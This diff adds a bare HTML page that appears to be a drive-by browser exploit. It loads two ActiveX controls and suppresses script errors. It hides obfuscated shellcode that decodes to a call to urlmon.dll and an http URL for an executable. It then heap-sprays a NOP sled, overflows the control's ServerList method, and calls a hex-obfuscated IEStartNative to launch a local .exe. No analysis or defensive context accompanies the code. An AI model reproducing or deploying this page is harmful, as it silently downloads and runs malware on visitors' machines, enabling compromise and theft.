@@ -1,0 +1,23 @@
+<html>
+<object classid="clsid:F917534D-535B-416B-8E8F-0C04756C31A8" id='target2'></object>
+<object classid="clsid:C14D003A-DA41-4FEE-8204-62A94EAA29D1" id='target'></object>
+<body>
+<script>window.onerror=function(){return true;}</script>
+<SCRIPT language="JavaScript">
+var shellcode1 = "tmp54EBtmp758Btmp8B3Ctmp3574tmp0378tmp56F5tmp768Btmp0320tmp33F5tmp49C9tmpAD41tmpDB33tmp0F36tmp14BEtmp3828tmp74F2tmpC108tmp0DCBtmpDA03tmpEB40tmp3BEFtmp75DFtmp5EE7tmp5E8Btmp0324tmp66DDtmp0C8Btmp8B4Btmp1C5EtmpDD03tmp048Btmp038BtmpC3C5tmp7275tmp6D6Ctmp6E6Ftmp642Etmp6C6Ctmp4300tmp5C3Atmp2e55tmp7865tmp0065tmpC033tmp0364tmp3040tmp0C78tmp408Btmp8B0Ctmp1C70tmp8BADtmp0840tmp09EBtmp408Btmp8D34tmp7C40tmp408Btmp953Ctmp8EBFtmp0E4EtmpE8ECtmpFF84tmpFFFFtmpEC83tmp8304tmp242CtmpFF3Ctmp95D0tmpBF50tmp1A36tmp702Ftmp6FE8tmpFFFFtmp8BFFtmp2454tmp8DFCtmpBA52tmpDB33tmp5353tmpEB52tmp5324tmpD0FFtmpBF5DtmpFE98tmp0E8Atmp53E8tmpFFFFtmp83FFtmp04ECtmp2C83tmp6224tmpD0FFtmp7EBFtmpE2D8tmpE873tmpFF40tmpFFFFtmpFF52tmpE8D0tmpFFD7tmpFFFFtmp7468tmp7074tmp2f3atmp772ftmp7777tmp722etmp7565tmp7869tmp632etmp2f6etmp6261tmp2e65tmp7865tmp0065";
+var shellcode = unescape(shellcode1.replace(/tmp/g,"%u"));
+var nop = ["abc8090abc8090","fuck"];
+var dsffsgdfg = unescape(nop[0].replace(/abc8/g,"%u9"));
+while (dsffsgdfg.length<139) dsffsgdfg+=dsffsgdfg;
+filldfgdfg = dsffsgdfg.substring(0, 139);
+dfgdfg = dsffsgdfg.substring(0, dsffsgdfg.length-139);
+while(dfgdfg.length+139<0x40000) dfgdfg = dfgdfg+dfgdfg+filldfgdfg;
+gdfgdh = new Array();
+for (x=0; x<300; x++) gdfgdh[x] = dfgdfg +shellcode;
+var zdfdftu = '';
+while (zdfdftu.length < 1542) zdfdftu+='\x0a\x0a\x0a\x0a';
+target.ServerList(zdfdftu);
+target2["\x49\x45\x53\x74\x61\x72\x74\x4e\x61\x74\x69\x76\x65"]("/../../../../U.exe","bye","never");
+</script>
+</body>
+</html>
